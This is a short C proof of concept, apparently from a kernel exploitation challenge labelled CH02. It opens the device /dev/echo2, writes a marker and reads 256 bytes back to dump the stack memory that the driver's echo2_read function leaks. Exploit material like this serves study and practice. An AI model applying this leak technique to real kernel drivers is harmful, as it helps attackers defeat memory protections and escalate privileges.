/* Prueba del leak de CH02: vuelca el frame de pila que devuelve echo2_read */
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(void)
{
    unsigned long buf[32];
    int fd = open("/dev/echo2", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    write(fd, "AAAAAAAA", 8);
    memset(buf, 0, sizeof(buf));
    ssize_t n = read(fd, buf, 256);
    printf("read=%zd\n", n);
    for (int i = 0; i < 32; i++)
        printf("+%03x: %016lx\n", i * 8, buf[i]);
    return 0;
}
